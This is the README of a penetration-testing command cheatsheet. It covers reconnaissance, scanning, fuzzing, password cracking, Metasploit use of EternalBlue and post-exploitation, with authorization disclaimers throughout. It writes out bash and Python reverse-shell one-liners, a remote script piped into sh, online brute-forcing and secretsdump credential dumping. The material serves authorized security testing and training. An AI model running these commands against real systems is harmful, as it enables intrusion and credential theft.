# 🛡️ Penetration Testing & Vulnerability Research Cheatsheet

Practical, searchable command reference for recon, scanning, fuzzing, reversing, and exploitation, designed for authorized use in professional and lab environments.

## 🚨 IMPORTANT: AUTHORIZED USE ONLY

**MISUSE IS ILLEGAL AND UNETHICAL.**

* **Explicit Authorization Required:** Only run these commands and tools against systems you **own** or for which you have **explicit written authorization** from the asset owner.
* **Purpose:** This cheatsheet is intended for **educational purposes, defensive hardening, and professional, authorized security testing/lab work**.
* **Safety:** Always test Proof-of-Concepts (PoCs) in isolated virtual machines (VMs) or containers to prevent accidental network spread or system damage.

---

## 📖 Contents

1.  [Recon & OSINT](#1-recon--osint)
2.  [Subdomain & DNS Enumeration](#2-subdomain--dns-enumeration)
3.  [Port & Service Discovery](#3-port--service-discovery)
4.  [Web Discovery & Fuzzing](#4-web-discovery--fuzzing)
5.  [Web Application Testing](#5-web-application-testing)
6.  [Vulnerability Scanning & SCA](#6-vulnerability-scanning--sca)
7.  [Passwords, Credentials & AD Tooling](#7-passwords-credentials--ad-tooling)
8.  [**Exploitation: Metasploit Framework (MSF)**](#8-exploitation-metasploit-framework-msf)
9.  [**Post-Exploitation: Shells & Enumeration**](#9-post-exploitation-shells--enumeration)
10. [Network & TLS Checks](#10-network--tls-checks)
11. [Vulnerability Research & PoC Triage](#11-vulnerability-research--poc-triage)
12. [Binary Reversing & Exploit Development](#12-binary-reversing--exploit-development)
13. [Fuzzing](#14-fuzzing)
14. [Mobile & Firmware Analysis](#15-mobile--firmware-analysis)
15. [Safe PoC Testing & Logging](#16-safe-poc-testing--logging)

---

### 1) Recon & OSINT

*OSINT and basic DNS lookups to gather targets and context.*

```bash
# Basic Lookups
whois example.com 

dig +short example.com A
nslookup -type=mx example.com

# OSINT (Authorized Use Only)
theharvester -d example.com -b google -l 500
shodan host 1.2.3.4

2) Subdomain & DNS Enumeration
Discover subdomains and DNS records.
# Amass (Passive + Active + Brute) 
amass enum -d example.com -o amass.txt

# Subfinder (Fast Passive)
subfinder -d example.com -o subfinder.txt

# crt.sh via curl + jq
curl -s "[https://crt.sh/?q=%25.example.com&output=json](https://crt.sh/?q=%25.example.com&output=json)" | jq -r '.[].name_value' | sort -u

# DNS Recon
dnsrecon -d example.com

3) Port & Service Discovery
Safe scanning patterns and fast discovery.
# Nmap (Version, default scripts, full ports) 
nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap-full 192.0.2.0/24

# Host Discovery
nmap -sn 192.0.2.0/24

# Service Banner Grab with Netcat
nc -vz 192.0.2.10 80
echo | nc 192.0.2.10 25

4) Web Discovery & Fuzzing
Directory discovery, vhost fuzzing, and parameter bruteforce.
# Ffuf (Directory/File Fuzzing)
ffuf -u [https://example.com/FUZZ](https://example.com/FUZZ) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -o ffuf.json

# Gobuster (Dir + Vhost)
gobuster dir -u [https://example.com/](https://example.com/) -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt

5) Web Application Testing
HTTP checks, nikto, sqlmap (lab only), XSS tooling.
# Curl Quick Checks 
curl -I -L [https://example.com](https://example.com)

# Nikto (Webserver checks)
nikto -h [https://example.com](https://example.com) -output nikto.txt

# Sqlmap (ONLY in-scope & lab)
sqlmap -u "[https://example.com/vuln.php?id=1](https://example.com/vuln.php?id=1)" --batch --dbs

# XSS Tools (Use against self-owned/lab only)
xsstrike -u "[https://example.com/page?param=1](https://example.com/page?param=1)"

# Parameter Discovery
arjun -u "[https://example.com/page](https://example.com/page)" -o arjun.txt

6) Vulnerability Scanning & SCA
Fast templates, SCA, SBOM generation and vulnerability lookup.
# Nuclei (Fast Templates) 
nuclei -l hosts.txt -t cves/ -o nuclei_results.txt

# Syft: Generate SBOM
syft packages dir:./project -o json > sbom.json

# Grype: Scan SBOM
grype sbom:sbom.json

# Query NVD
curl -s "[https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228](https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228)" | jq .

7) Passwords, Credentials & AD Tooling
Online & offline password tools, impacket and BloodHound.
# Hydra (Online Bruteforce) - AUTHORIZED ONLY 
hydra -L users.txt -P passwords.txt -t 4 ssh://192.0.2.10 -o hydra-ssh.txt

# John / Hashcat (Offline)
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Impacket Scripts
python3 /opt/impacket/examples/secretsdump.py domain/USER:PASS -outputfile secrets

# BloodHound Collection (with rights)
Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip

8) Exploitation: Metasploit Framework (MSF)
Fundamental commands for the Metasploit Framework, for use in authorized labs.
# Start MSF console
msfconsole

# Search for a specific exploit
search cve:2017-0143
search type:exploit platform:windows smb

# Select an exploit or auxiliary module
use exploit/windows/smb/ms17_010_eternalblue

# Show and set required options
show options
set RHOSTS 192.168.1.0/24
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.5

# Check if target is vulnerable (safe)
check

# Execute the module (authorized/lab only)
exploit

9) Post-Exploitation: Shells & Enumeration
Techniques for reverse shells and quick local enumeration helpers (linPEAS, winPEAS, Sysinternals).
# Netcat listener (for catching reverse shells)
nc -lvnp 4444

# Basic Bash Reverse Shell (one-liner)
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

# Python Reverse Shell (stable, requires python)
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Linux Enumeration with linpeas (lab only)
curl -s [https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh) | sh

# Windows Enumeration with winPEAS (lab only)
.\winpeas.exe

10) Network & TLS Checks
pcap capture, tshark analysis and quick TLS checks.
# Tcpdump (capture 1000 packets) 
tcpdump -i eth0 -w capture.pcap -c 1000

# Tshark read
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri

# Quick Cert Info
openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text

# SSL/TLS Scanning
sslyze --regular example.com:443

11) Vulnerability Research & PoC Triage
Search public PoCs, triage, isolate and verify safely.
# Searchsploit 
searchsploit "CVE-2021-44228"
searchsploit -m 49993 # copy exploit by EDB ID

# Fetch PoC read-only (inspect before running)
curl -sL "[https://raw.githubusercontent.com/user/repo/branch/poc.py](https://raw.githubusercontent.com/user/repo/branch/poc.py)" -o /tmp/poc.py

# Run PoC inside an isolated container (no network)
docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -c "python /poc/poc.py"

12) Binary Reversing & Exploit Development
Static inspection, decompilers and ROP gadget hunting.
# ELF Inspection 
readelf -h binary
objdump -d binary | less
strings binary

# Radare2
r2 -AA binary

# ROP Gadgets
ropgadget --binary binary --only "pop|ret" > gadgets.txt

# GDB + pwndbg
gdb -q ./binary

13) Fuzzing
Classic fuzzers and HTTP/API fuzzers.
# AFL (instrumented binary) 
afl-fuzz -i in_dir -o out_dir -- ./target @@

# Wfuzz for HTTP
wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "[https://example.com/vuln?FUZZ=1](https://example.com/vuln?FUZZ=1)"

14) Mobile & Firmware Analysis
APK decompilation, Frida dynamic hooks, firmware extraction.
# Android Decompile / Inspect 
apktool d app.apk -o app_src
jadx -d out app.apk

# Frida Dynamic Hooking (authorized/lab only)
frida -U -f com.example.app -l script.js --no-pause

# Firmware Extraction
binwalk -e firmware.bin
strings firmware.bin | grep -i password

15) Safe PoC Testing & Logging
Isolated containers, snapshots and no-network execution.
# Isolated Container (no external network) 
docker run --rm --network none -v $(pwd):/work -it ubuntu:22.04 bash

# Spin up target service in container (lab environment)
docker run --rm -p 8080:80 vuln-app:latest

# Logging with timestamps & tool version
(tool --version 2>&1 ; date; tool [args]) |& tee logfile.txt

# Save JSON where possible
nuclei -o nuclei.json -oJ nuclei.json
ffuf -o ffuf.json -of json

Quick Safety & Research Summary
 * Isolate Testing: Always use containers or VM snapshots before running exploits.
 * Validate Manually: Don't trust scanner output; manually verify vulnerabilities.
 * Document Everything: Record CVE IDs, vendor advisories, and affected versions.
 * Stay Legal: Never test systems without explicit, written, and current authorization.
<!-- end list -->


📋 Copy buttons – One-click copy for every code block.

🧱 Collapse / Expand all – Quickly minimize or expand sections.

🧾 Export to Markdown – Generate a ready-to-share .md version.

🌙 Dark, glassy UI – Clean, readable design with Highlight.js syntax highlighting.

💻 Fully client-side – No frameworks, no server, no tracking.



---

🧩 Tech Stack

HTML5 + CSS3 (Custom styling, glassmorphism theme)

Highlight.js – Syntax highlighting for code blocks

Vanilla JS – Search, copy, collapse, and markdown export functionality



---

📂 Project Structure

index.html — Main cheatsheet (self-contained)
README.md — You're here!

Everything is contained in a single, portable HTML file — just open in your browser or host it anywhere (e.g., GitHub Pages, Netlify, Cloudflare Pages).


---

💡 Usage

Local View

git clone https://github.com/<your-username>/pentest-cheatsheet.git
cd pentest-cheatsheet
open index.html   # macOS
start index.html  # Windows
xdg-open index.html # Linux

GitHub Pages

1. Push your repository to GitHub.


2. Go to Settings → Pages.


3. Select main branch and / (root) folder.


4. Save — your cheatsheet will be live at:
https://<username>.github.io/pentest-cheatsheet/




---

🔐 Ethical & Legal Notice

This project is intended for authorized penetration testing, lab simulations, and defensive training only.
Do not use these commands or tools against systems without explicit permission.

Disclaimer:
The author assumes no liability for misuse. You are responsible for your own actions.


---

🧭 Sections Overview

1. Recon & OSINT


2. Subdomain & DNS Enumeration


3. Port & Service Discovery


4. Web Discovery & Fuzzing


5. Web Application Testing


6. Vulnerability Scanning & SCA


7. Passwords & AD Tools


8. Post-Exploitation


9. Network / TLS Analysis


10. Vulnerability Research


11. Reversing & Exploit Development


12. Fuzzing


13. Mobile & Firmware


14. Safe PoC Testing


15. Logging & Tips




---

🛠️ Customization

Add or edit sections directly in the <article> blocks.

Change syntax highlighting theme via the Highlight.js CDN line.

Adjust color scheme under the :root CSS variables for instant theme changes.



---

📜 License

MIT License © 2025
You may share and modify this for educational or ethical security purposes only.
Redistribution with malicious intent is strictly prohibited.


---

🌐 Live @ https://hackerscheatsheet.onrender.com/

---

❤️ Contribute

Pull requests are welcome — add new categories, better formatting, or new safe tooling commands.


---

Stay sharp, hack responsibly.
